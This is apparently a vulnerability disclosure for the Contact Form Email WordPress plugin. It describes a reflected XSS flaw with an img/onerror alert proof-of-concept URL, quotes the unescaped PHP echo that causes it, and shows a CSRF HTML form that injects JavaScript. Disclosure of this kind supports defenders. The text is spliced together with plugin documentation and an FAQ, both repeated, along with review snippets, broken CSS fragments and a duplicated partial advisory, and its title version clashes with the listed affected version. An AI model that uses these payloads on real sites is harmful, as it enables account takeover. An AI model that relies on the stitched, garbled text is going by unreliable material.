# Contact Form Email 7.10.41 - Reflected XSS & CSRF (WordPress Plugin)

 [Security](/blog/categories/security/)
 [vulnerability](/blog/categories/vulnerability/)
 [wordpress plugin](/blog/categories/wordpress-plugin/)
 [xss](/blog/categories/xss/)
 [CSRF](/blog/categories/csrf/)

* Vulnerability: XSS & CSRF
* Affected Software: [Contact Form Email](https://wordpress.org/plugins/contact-form-to-email/) (30,000+ active installations)
* Affected Version: 1.2.65
* Patched Version: 1.2.66
* CVE: CVE-2019-9646 (XSS)
* Risk: Medium
* Vendor Contacted: 10/31/2018
* Vendor Fix: 10/31/2018
* Public Disclosure: 02/05/2019

## Reflected XSS

##### CVSS

6.1 Medium [CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

##### Details

The Contact Form Email WordPress plugin is vulnerable to reflected XSS as it echoes the item parameter without proper encoding.

Successful exploitation allows an attacker to execute JavaScript in the context of the application in the name of an attacked user. This in turn enables an attacker to bypass CSRF protection and thus perform any actions the legitimate user can perform, as well as read data which the user can access.

##### Proof of Concept

```
http://192.168.0.103/wordpress/wp-admin/admin.php?page=cp_contactformtoemail&edit=1&cal=1&item='"><img+src%3Dx+onerror%3Dalert(1)>

```
##### Code

```
contact-form-to-email/cp_admin_int_edition.inc.php
<input name="cfwpp_edit" type="hidden" value="<?php echo $_GET["item"]; ?>" />

```
## CSRF (to XSS)

##### CVSS

6.1 Medium [CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

##### Details

The plugin allows the addition of custom JavaScript to forms. Because the request to place this addition is not protected against CSRF, an attacker can place arbitrary JavaScript into the application if an authenticated user visits a webpage containing malicious HTML and/or JavaScript.

##### Proof of Concept

```
<html>
  <body>
    <form action="http://192.168.0.103/wordpress/wp-admin/admin.php?page=cp_contactformtoemail&edit=1&cal=1&item=js" method="POST">
      <input type="hidden" name="CP&#95;CFTE&#95;post&#95;edition" value="1" />
      <input type="hidden" name="cfwpp&#95;edit" value="js" />
      <input type="hidden" name="editionarea" value="alert(2);" />
      <input type="hidden" name="submit" value="Save&#32;Changes" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

#### Contact Form to Email Messages List

The messages list helps to check the past contact form submissions and print or export them. Includes a search/filter form with the following options:

* **Search for:** Search for a text into the contact form messages.
* **From … to:** Date interval to be included in the list/reports.

* **Export to CSV:** Export the CSV data according to the selected filters/options.

The CSV file will contain a first row with the field names and the next rows will contain one contact form submission per row, with one for field on each column. This way you can easily import the data from other applications or just select the columns/fields that you need (example: select only the emails). A CSV file can be opened and managed using Excel.

The list of contact form messages is shown below the search area. A print button below the list provides the messages list in a printable format.

#### The Contact Form Reports

The reports section lets you **analyze the use of the contact forms** and the data entered into them. The first section of the reports is a filter section similar to the one that appears in the messages list page. Below the filters section there are three graphical reports:

* **Submissions per day:** The report will display in point-lines graphic how many contact form submissions have been received each day in the selected date range. This report can be used to evaluate the contact form peaks and measure the impact of marketing actions.
* **Submissions per hour:** The report will display in a point-lines graphic how many contact form messages are received on each hour of the date; this is for the total messages in the selected date range. This report can be used for checking peak hours and focus the support service on those hours.
* **Report of values for a selected field:** Select any of the contact form fields and other information fields (like date, IP address, hours) to get a report of how many times each value have been entered or selected. This is very useful if you form is used as a poll to get feedback from users, it makes easy to generate a report on selectable contact form fields. This report can be used also to study the most common data entered in the contact form and get a better idea of your customer’s profile and needs.

A print button at the end of the page can be used to print the report of the values for the selected contact form field in a printer-friendly format.

#### Automatic Email Reports

The Contact Form to Email plugin allows the setup of two types of automatic (periodical) Email reports:

* **Global Email Reports:** Can be setup below the list of forms. This report sends a report with the new submissions of all forms every the specified number of days.
* **Form Email Reports:** Can be setup on the settings page of each form. This report sends a report with the new submissions of the related form every the specified number of days.

The reports are attached in a CSV / Excel file into the emails. In both cases the destination email addresses, email subject, email text and the report’s interval can be specified. More info available in the section “Other Notes”.

#### Language Support

The Contact Form to Email plugin is compatible with all charsets. The troubleshoot area contains options to change the encoding of the plugin database tables if needed.

Translations are supported through PO/MO files located in the Contact Form to Email plugin folder “languages”.

Multiple translations are already included in the plugin.

#### Contact Form to Email Updates

New features has been published in the current Contact Form to Email version 1.2.7 based on the feedback received and we would like to thank you all the people that have supported the development, provided feedback and feature requests. The plugin is currently over the 630,000 downloads/installations and a new set of updates is already being prepared, any feature requests will be welcome. Thank you!

#### New: Form Builder

In the latest update a form builder was included to visually add/modify/delete text fields, text-areas and emails with their respective validations.

**Opening the contact form messages in Excel:** Go either to the “Reports” or “Messages” section. There is a button labeled “Export to CSV”. CSV files can be opened in Excel, just double-click the downloaded CSV file, it will contain the selected contact form submissions, one per line.

**Deleting a contact form message:** Go to the “Messages” section and use the button labeled “Delete” for the contact form message you want to delete. Each row in that list is a contact form submission.

**Get the contact form email from the user:** The email used as from is a fixed email specified on the contact form settings, this helps to prevent be classified as spam, however when you hit “reply” over the received email, the user’s email address will appear allow you to easily reply the contact form messages. The header “Reply-to” is used for this purpose.

**Customizing the captcha image:** The captcha image used in the contact form is 100% implemented into the plugin, this way you don’t need to rely on third party services/servers. In addition to the settings for customizing the captcha design you can also replace the font files located into the folder “contact-form-to-email/captcha/”. The fonts are used as base for rendering the captcha on the contact form.

**Contact form email format:** The notifications emails sent from the contact form can be either plain-text emails or HTML emails. Plain text emails are preferred in most cases since are easier to edit and pass the anti-spam filters with more probability.

**Contact form Clone button:** The clone button duplicates a complete contact form with its settings. The contact form messages / emails and statistics aren’t duplicated.

#### Custom contact form submit button

There is a settings section info each form that allows to specify the label of the submit button.

The class=”pbSubmit” can be used to modify the button styles.

The styles can be applied into any of the CSS files of your theme or add the needed styles into the “Contact Form to Email plugin >> Customization area >> Add Custom Styles” (at the bottom of the page that contains the list of forms)

For further modifications the submit button is located at the end of the file “cp-public-int.inc.php”.

For general CSS styles modifications to the form and samples check this FAQ entry: https://form2email.dwbooster.com/faq#q82

#### Customizing the automatic email reports

The settings for the email reports (both the global and per form reports) include the following configuration fields:

* **Enable Reports?:** Option for enabling / disabling the reports.
* **Send report every:** Indicate every how many days the reports will be sent.
* **Send after this hour (server time):** Approximate time at which the reports will be sent. This time is based on the server time. Some activity is needed on the website for sending the reports. You can setup a cron for a more exact delivery time.
* **Send email from:** The “from” email used for the reports. Avoid @aol.com and @hotmail.com “from” addresses to skip the anti-spam filters.
* **Send to email(s):** The list of emails (comma separated) that will receive the reports.
* **Email subject:** Subject of the email that will be sent with the Contact Form to Email reports.
* **Email format?:** Format of the email that will be sent with the Contact Form to Email reports. Can be HTML or Plain Text. In most cases plain text is easier to setup and has less problems with anti-spam services.
* **Email Text (CSV file will be attached):** Content of the email that will contain the Contact Form to Email reports. The reports will be attached in CSV format into the email.

#### The contact form database

The messages received via the contact form are stored into the WordPress contact form database table “wp\_cftemail\_messages”. You can export that data in form of automatic email reports or in CSV/Excel format from the messages list area. If needed you can also query that table directly for further processing of the contact form data.

#### Importing messages

There is an option to import messages into the Contact Form to Email plugin. That option is located below the messages list and is labeled “Import CSV”.

The messages can be imported in a comma separated CSV file. One record per line, one field per column. Don’t use a header row with the field names.

The first 3 columns into the CSV file are the time, IP address and email address, if you don’t have this information then leave the first three columns empty. After those initial columns the fields (columns) must appear in the same order than in the form.

Sample format for the CSV file:

```
2013-04-21 18:50:00, 192.168.1.12, john@sample.com, "john@sample.com", "sample subject", "sample message"
2013-05-16 20:49:00, 192.168.1.24, jane.smith@sample.com, "jane.smith@sample.com", "other subject", "other message"

```
#### From address used for the emails

Into the “Form Processing / Email Settings” section the first settings field is named “Send email “From” and has the following options:

* **From fixed email address indicated below – Recommended option:** If you select “from fixed…” the customer email address will appear in the “to” address when you hit “reply”, this is the recommended setting to avoid mail server restrictions.
* **From the email address indicated by the customer:** If you select “from customer email” then the customer email will appear also visually when you receive the email, but this isn’t supported by all hosting services, so this option isn’t recommended in most cases.

#### The drag and drop contact form builder

The Form Builder lets you to add/edit/remove fields into the contact form and also to specify the validation rules for your contact form (required fields, email fields, etc…).

The following field types are currently available in the version published at this WordPress directory:

* **Single Line Text:** Classic one-line text input.
* **Email:** This field validates that the email address has a valid format.
* **Paragraph Text:** Classic multi-line (textarea) text input.

In other versions of the plugin the following field are also available: Numeric field with specific validations, Date-picker, Checkboxes, Multiple Choice Radio buttons, Dropdown / Select, Upload file fields, Password, Phone with specific validations, static texts, section breaks and page breaks for multi-page contact forms.

**Other features in the contact form builder:**

* **Equal fields validation:** Use it for example to confirm if the email or text typed in two different fields are the same. This is valid for “Single Line Text” and “Email” fields.
* **Dependent fields:** Use this feature for show/hide fields (any field type) based in the selection made on other fields (checkboxes, radiobuttons or select/drop-down fields). This feature isn’t fully available in this version since the related fields aren’t included.

## FAQ

### Q: How can I add specific fields into the email message?

A: There is a tag named <%INFO%> that is replaced with all the information posted from the contact form, however you can use also optional tags for specific fields into the contact form.

For doing that, click the desired field into the form builder and in the settings box for that field there is a read-only setting named “Field tag for the message (optional):”. Copy & paste that tag into the contact form message text and after the form submission that tag will be replaced with the text entered in the form field.

The tags have this structure (example): <%fieldname1%>, <%fieldname2%>, <%fieldname3%>, …

More info and supported tags at https://form2email.dwbooster.com/faq#q81

### Q: Can I add a reference to the item number (submission number) into the email?

A: Use the tag <%itemnumber%> into the email content. That tag will be replaced by the contact form submission item number.

### Q: The contact form doesn’t appear. What is the solution?

A: The cause is in most cases a conflict with a third party plugin or with the theme. To fix that, go to the “troubleshoot area” (located below the list of forms in the settings area) change the “Script load method” from “Classic” to “Direct”.

If the problem persists after that modification please contact our support service and we will give you a solution. We will appreciate any feedback to make the contact form avoid conflicts with third party plugins/themes.

### Q: I’m having problems with non-latin characters in the contact form.

A: Use the “troubleshoot area” to change the character encoding. Try first with the UTF-8 option.

### Q: I’m getting this message: “Destination folder already exists”. Solution?

A: The free version must be deleted before installing the pro version.

If you are uploading a new version via Plugins – New – Upload and a previous version is still installed, then delete the previous version first. This is a safe step, the plugin’s data and settings won’t be lost during the process.

Another alternative is to overwrite the plugin files through a FTP connection. This is also a safe step.

### Q: How to edit or remove the form title / header?

A: Into the form builder in the administration area, click the “Form Settings” tab. That area is for editing the form title and header text.

It can be used also for different alignment of the field labels.

### Q: Can I align the form horizontally in two or more columns?

A: Into the form editor click a field and into its settings there is one field named “Add Css Layout Keywords”. Into that field you can put the name of a CSS class that will be applied to the field.

There are some pre-defined CSS classes to use align two, three or four fields into the same line. The CSS classes are named:

```
column2
column3
column4

```

For example if you want to put two fields into the same horizontal line then specify for both fields the class name “column2”.

### Q: What means each field in the contact form settings area?

A: For each contact form you will be able to edit the following settings:

### Q: Can I get the URL of the page where the form was displayed before submission?

A: Yes, you can add the tag to the email content and that tag will be replaced with the address of the page where the form was displayed and submitted.

### Q: How can I apply CSS styles to the contact form fields?

A: To modify the **whole styles of the contact form fields and labels**, add the needed styles into the “Customization area >> Add Custom Styles” (at the bottom of the page that contains the list of forms)

* **Change the styles of all the field labels:**

### fbuilder, #fbuilder label, #fbuilder span {

color: #00f;

}

* **Change the styles of all the input and textarea fields:**

### fbuilder input[type=text], #fbuilder textarea, #fbuilder select {

border: 2px solid #00f;

}

* **Change the contact form submit button:**

### fbuilder .pbSubmit {

color: #00f;

font-weight: bold;

}

* **Change the “contact form title” and “header description”:**

### fbuilder .fform span {font-size:16px;}

**On the other hand to modify only a specific field into the contact form:**

* **Step #1:** Into the contact form builder, click a field to edit its details, there is a setting there named “Add CSS Layout Keywords”.
* **Step #2:** You can add a class name into that field, so the style specified into the CSS class will be applied to that field.
* **Step #3 (Note):** Don’t add style rules directly there in the contact form builder but the name of a CSS class.
* **Step #4:** You can place the CSS class either into the CSS file of your template or into the file “wp-content/plugins/contact-form-to-email/css/stylepublic.css” located into the Contact Form to Email plugin’s folder.

**Examples:** Add a class named “specialclass” into the setting “Add CSS Layout Keywords” and add one of these CSS rules into the mentioned file:

* For changing the field label:

  ```
  .specialclass label {
  color: #00f;
  }

  ```
* For changing the input or textarea of the field:

  ```
  .specialclass input[type=text],.specialclass textarea,.specialclass select {
  border: 2px solid #00f;
  }

  ```

To get the modifications shown into the public contact form you may have to refresh the page twice or clear the browser cache to be sure that the old CSS styles aren’t still being shown from the cache.

More info at add the needed styles into the “Customization area >> Add Custom Styles” (at the bottom of the page that contains the list of calendars)

### Q: Are the forms GDPR compliant?

A: In all plugin versions you can turn off IP tracking to avoid saving that user info and an “accept terms” / “accept GDPR” field is available.

<!– wp:paragraph –>
<p class=””>The free version offers 3 types of form field you can barely create any decent form with. I understand it’s free. There are other solid form plugins that offer way many more types of form field. Also, the main screen to manage form is cluttered with unimportant stuff. Reason I gave it a try is because the plugin passes all the WP Hive Insights tests.</p>

This plugin saves me the time and tediousness of playing postmaster to every contact us inquiry that comes in, and it helps to reduce the number of email addresses that are live on your posts and pages. Highly recommended.

#### Contact Form to Email Messages List

The messages list helps to check the past contact form submissions and print or export them. Includes a search/filter form with the following options:

* **Search for:** Search for a text into the contact form messages.
* **From … to:** Date interval to be included in the list/reports.
* **Item:** You can have more than one contact form. Select here if you want to get the results of a specific contact form or from all contact forms.
* **Filter:** Shows the list according to the selected filters/options.
* **Export to CSV:** Export the CSV data according to the selected filters/options.

The CSV file will contain a first row with the field names and the next rows will contain one contact form submission per row, with one for field on each column. This way you can easily import the data from other applications or just select the columns/fields that you need (example: select only the emails). A CSV file can be opened and managed using Excel.

The list of contact form messages is shown below the search area. A print button below the list provides the messages list in a printable format.

#### The Contact Form Reports

The reports section lets you **analyze the use of the contact forms** and the data entered into them. The first section of the reports is a filter section similar to the one that appears in the messages list page. Below the filters section there are three graphical reports:

* **Submissions per day:** The report will display in point-lines graphic how many contact form submissions have been received each day in the selected date range. This report can be used to evaluate the contact form peaks and measure the impact of marketing actions.
* **Submissions per hour:** The report will display in a point-lines graphic how many contact form messages are received on each hour of the date; this is for the total messages in the selected date range. This report can be used for checking peak hours and focus the support service on those hours.
* **Report of values for a selected field:** Select any of the contact form fields and other information fields (like date, IP address, hours) to get a report of how many times each value have been entered or selected. This is very useful if you form is used as a poll to get feedback from users, it makes easy to generate a report on selectable contact form fields. This report can be used also to study the most common data entered in the contact form and get a better idea of your customer’s profile and needs.

A print button at the end of the page can be used to print the report of the values for the selected contact form field in a printer-friendly format.

#### Automatic Email Reports

The Contact Form to Email plugin allows the setup of two types of automatic (periodical) Email reports:

* **Global Email Reports:** Can be setup below the list of forms. This report sends a report with the new submissions of all forms every the specified number of days.
* **Form Email Reports:** Can be setup on the settings page of each form. This report sends a report with the new submissions of the related form every the specified number of days.

The reports are attached in a CSV / Excel file into the emails. In both cases the destination email addresses, email subject, email text and the report’s interval can be specified. More info available in the section “Other Notes”.

#### Language Support

The Contact Form to Email plugin is compatible with all charsets. The troubleshoot area contains options to change the encoding of the plugin database tables if needed.

Translations are supported through PO/MO files located in the Contact Form to Email plugin folder “languages”.

Multiple translations are already included in the plugin.

#### Contact Form to Email Updates

New features has been published in the current Contact Form to Email version 1.2.7 based on the feedback received and we would like to thank you all the people that have supported the development, provided feedback and feature requests. The plugin is currently over the 630,000 downloads/installations and a new set of updates is already being prepared, any feature requests will be welcome. Thank you!

#### New: Form Builder

In the latest update a form builder was included to visually add/modify/delete text fields, text-areas and emails with their respective validations.

**Opening the contact form messages in Excel:** Go either to the “Reports” or “Messages” section. There is a button labeled “Export to CSV”. CSV files can be opened in Excel, just double-click the downloaded CSV file, it will contain the selected contact form submissions, one per line.

**Deleting a contact form message:** Go to the “Messages” section and use the button labeled “Delete” for the contact form message you want to delete. Each row in that list is a contact form submission.

**Get the contact form email from the user:** The email used as from is a fixed email specified on the contact form settings, this helps to prevent be classified as spam, however when you hit “reply” over the received email, the user’s email address will appear allow you to easily reply the contact form messages. The header “Reply-to” is used for this purpose.

**Customizing the captcha image:** The captcha image used in the contact form is 100% implemented into the plugin, this way you don’t need to rely on third party services/servers. In addition to the settings for customizing the captcha design you can also replace the font files located into the folder “contact-form-to-email/captcha/”. The fonts are used as base for rendering the captcha on the contact form.

**Contact form email format:** The notifications emails sent from the contact form can be either plain-text emails or HTML emails. Plain text emails are preferred in most cases since are easier to edit and pass the anti-spam filters with more probability.

**Contact form Clone button:** The clone button duplicates a complete contact form with its settings. The contact form messages / emails and statistics aren’t duplicated.

#### Custom contact form submit button

There is a settings section info each form that allows to specify the label of the submit button.

The class=”pbSubmit” can be used to modify the button styles.

The styles can be applied into any of the CSS files of your theme or add the needed styles into the “Contact Form to Email plugin >> Customization area >> Add Custom Styles” (at the bottom of the page that contains the list of forms)

For further modifications the submit button is located at the end of the file “cp-public-int.inc.php”.

For general CSS styles modifications to the form and samples check this FAQ entry: https://form2email.dwbooster.com/faq#q82

#### Customizing the automatic email reports

The settings for the email reports (both the global and per form reports) include the following configuration fields:

* **Enable Reports?:** Option for enabling / disabling the reports.
* **Send report every:** Indicate every how many days the reports will be sent.
* **Send after this hour (server time):** Approximate time at which the reports will be sent. This time is based on the server time. Some activity is needed on the website for sending the reports. You can setup a cron for a more exact delivery time.
* **Send email from:** The “from” email used for the reports. Avoid @aol.com and @hotmail.com “from” addresses to skip the anti-spam filters.
* **Send to email(s):** The list of emails (comma separated) that will receive the reports.
* **Email subject:** Subject of the email that will be sent with the Contact Form to Email reports.
* **Email format?:** Format of the email that will be sent with the Contact Form to Email reports. Can be HTML or Plain Text. In most cases plain text is easier to setup and has less problems with anti-spam services.
* **Email Text (CSV file will be attached):** Content of the email that will contain the Contact Form to Email reports. The reports will be attached in CSV format into the email.

#### The contact form database

The messages received via the contact form are stored into the WordPress contact form database table “wp\_cftemail\_messages”. You can export that data in form of automatic email reports or in CSV/Excel format from the messages list area. If needed you can also query that table directly for further processing of the contact form data.

#### Importing messages

There is an option to import messages into the Contact Form to Email plugin. That option is located below the messages list and is labeled “Import CSV”.

The messages can be imported in a comma separated CSV file. One record per line, one field per column. Don’t use a header row with the field names.

The first 3 columns into the CSV file are the time, IP address and email address, if you don’t have this information then leave the first three columns empty. After those initial columns the fields (columns) must appear in the same order than in the form.

Sample format for the CSV file:

```
2013-04-21 18:50:00, 192.168.1.12, john@sample.com, "john@sample.com", "sample subject", "sample message"
2013-05-16 20:49:00, 192.168.1.24, jane.smith@sample.com, "jane.smith@sample.com", "other subject", "other message"

```
#### From address used for the emails

Into the “Form Processing / Email Settings” section the first settings field is named “Send email “From” and has the following options:

* **From fixed email address indicated below – Recommended option:** If you select “from fixed…” the customer email address will appear in the “to” address when you hit “reply”, this is the recommended setting to avoid mail server restrictions.
* **From the email address indicated by the customer:** If you select “from customer email” then the customer email will appear also visually when you receive the email, but this isn’t supported by all hosting services, so this option isn’t recommended in most cases.

#### The drag and drop contact form builder

The Form Builder lets you to add/edit/remove fields into the contact form and also to specify the validation rules for your contact form (required fields, email fields, etc…).

The following field types are currently available in the version published at this WordPress directory:

* **Single Line Text:** Classic one-line text input.
* **Email:** This field validates that the email address has a valid format.
* **Paragraph Text:** Classic multi-line (textarea) text input.

In other versions of the plugin the following field are also available: Numeric field with specific validations, Date-picker, Checkboxes, Multiple Choice Radio buttons, Dropdown / Select, Upload file fields, Password, Phone with specific validations, static texts, section breaks and page breaks for multi-page contact forms.

**Other features in the contact form builder:**

* **Equal fields validation:** Use it for example to confirm if the email or text typed in two different fields are the same. This is valid for “Single Line Text” and “Email” fields.
* **Dependent fields:** Use this feature for show/hide fields (any field type) based in the selection made on other fields (checkboxes, radiobuttons or select/drop-down fields). This feature isn’t fully available in this version since the related fields aren’t included.

## FAQ

### Q: How can I add specific fields into the email message?

A: There is a tag named <%INFO%> that is replaced with all the information posted from the contact form, however you can use also optional tags for specific fields into the contact form.

For doing that, click the desired field into the form builder and in the settings box for that field there is a read-only setting named “Field tag for the message (optional):”. Copy & paste that tag into the contact form message text and after the form submission that tag will be replaced with the text entered in the form field.

The tags have this structure (example): <%fieldname1%>, <%fieldname2%>, <%fieldname3%>, …

More info and supported tags at https://form2email.dwbooster.com/faq#q81

### Q: Can I add a reference to the item number (submission number) into the email?

A: Use the tag <%itemnumber%> into the email content. That tag will be replaced by the contact form submission item number.

### Q: The contact form doesn’t appear. What is the solution?

A: The cause is in most cases a conflict with a third party plugin or with the theme. To fix that, go to the “troubleshoot area” (located below the list of forms in the settings area) change the “Script load method” from “Classic” to “Direct”.

If the problem persists after that modification please contact our support service and we will give you a solution. We will appreciate any feedback to make the contact form avoid conflicts with third party plugins/themes.

### Q: I’m having problems with non-latin characters in the contact form.

A: Use the “troubleshoot area” to change the character encoding. Try first with the UTF-8 option.

### Q: I’m getting this message: “Destination folder already exists”. Solution?

A: The free version must be deleted before installing the pro version.

If you are uploading a new version via Plugins – New – Upload and a previous version is still installed, then delete the previous version first. This is a safe step, the plugin’s data and settings won’t be lost during the process.

Another alternative is to overwrite the plugin files through a FTP connection. This is also a safe step.

### Q: How to edit or remove the form title / header?

A: Into the form builder in the administration area, click the “Form Settings” tab. That area is for editing the form title and header text.

It can be used also for different alignment of the field labels.

### Q: Can I align the form horizontally in two or more columns?

A: Into the form editor click a field and into its settings there is one field named “Add Css Layout Keywords”. Into that field you can put the name of a CSS class that will be applied to the field.

There are some pre-defined CSS classes to use align two, three or four fields into the same line. The CSS classes are named:

```
column2
column3
column4

```

For example if you want to put two fields into the same horizontal line then specify for both fields the class name “column2”.

### Q: What means each field in the contact form settings area?

A: For each contact form you will be able to edit the following settings:

Note: All the submissions are stored into the contact form database, so can be easily recovered when needed.

### Q: Can I get the URL of the page where the form was displayed before submission?

A: Yes, you can add the tag to the email content and that tag will be replaced with the address of the page where the form was displayed and submitted.

### Q: How can I apply CSS styles to the contact form fields?

A: To modify the **whole styles of the contact form fields and labels**, add the needed styles into the “Customization area >> Add Custom Styles” (at the bottom of the page that contains the list of forms)

* **Change the styles of all the field labels:**

color: #00f;

}

border: 2px solid #00f;

}

* **Change the contact form submit button:**

color: #00f;

font-weight: bold;

}

* **Change the “contact form title” and “header description”:**

### fbuilder .fform span {font-size:16px;}

**On the other hand to modify only a specific field into the contact form:**

* **Step #1:** Into the contact form builder, click a field to edit its details, there is a setting there named “Add CSS Layout Keywords”.
* **Step #2:** You can add a class name into that field, so the style specified into the CSS class will be applied to that field.
* **Step #3 (Note):** Don’t add style rules directly there in the contact form builder but the name of a CSS class.
* **Step #4:** You can place the CSS class either into the CSS file of your template or into the file “wp-content/plugins/contact-form-to-email/css/stylepublic.css” located into the Contact Form to Email plugin’s folder.

**Examples:** Add a class named “specialclass” into the setting “Add CSS Layout Keywords” and add one of these CSS rules into the mentioned file:

* For changing the field label:

  ```
  .specialclass label {
  color: #00f;
  }

  ```
* For changing the input or textarea of the field:

  ```
  .specialclass input[type=text],.specialclass textarea,.specialclass select {
  border: 2px solid #00f;
  }

  ```

To get the modifications shown into the public contact form you may have to refresh the page twice or clear the browser cache to be sure that the old CSS styles aren’t still being shown from the cache.

More info at add the needed styles into the “Customization area >> Add Custom Styles” (at the bottom of the page that contains the list of calendars)

### Q: Are the forms GDPR compliant?

A: In all plugin versions you can turn off IP tracking to avoid saving that user info and an “accept terms” / “accept GDPR” field is available.

<!– wp:paragraph –>
<p class=””>The free version offers 3 types of form field you can barely create any decent form with. I understand it’s free. There are other solid form plugins that offer way many more types of form field. Also, the main screen to manage form is cluttered with unimportant stuff. Reason I gave it a try is because the plugin passes all the WP Hive Insights tests.</p>

This plugin saves me the time and tediousness of playing postmaster to every contact us inquiry that comes in, and it helps to reduce the number of email addresses that are live on your posts and pages. Highly recommended.

## Reflected XSS

##### CVSS

6.1 Medium
[CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N](<https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N>)

##### Overview

    <input name="cfwpp_edit" type="hidden" value="<?php echo
$_GET["item"]; ?>" />

##### Overview

The plugin allows the addition of custom JavaScript to forms. Because
the request to place this addition is not protected against CSRF, an
attacker can place arbitrary JavaScript into the application if an
authenticated user visits a webpage containing malicious HTML and/or
JavaScript.

##### Proof of Concept

    <html>
      <body>
        <form
action="<http://192.168.0.103/wordpress/wp-admin/admin.php?page=cp_contactformtoemail&edit=1&cal=1&item=js>"
method="POST">
          <input type="hidden" name="CP&#95;CFTE&#95;post&#95;edition"
value="1" />
          <input type="hidden" name="cfwpp&#95;edit" value="js" />
          <input type="hidden" name="editionarea" value="alert(2);" />
          <input type="hidden" name="submit" value="Save&#32;Changes" />
          <input type="submit" value="Submit request" />
        </form>
      </body>
    </html>
